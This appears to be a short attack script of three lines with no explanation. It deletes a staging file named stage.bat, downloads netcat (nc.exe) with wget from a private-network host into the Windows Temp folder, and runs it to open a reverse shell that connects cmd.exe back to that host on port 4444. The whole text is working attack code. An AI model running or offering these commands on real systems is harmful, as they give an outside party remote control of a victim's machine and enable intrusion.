del stage.bat
wget http://192.168.50.50:8000/nc.exe -O /Windows/Temp/nc.exe
/Windows/Temp/nc.exe 192.168.50.50 4444 -e cmd.exe
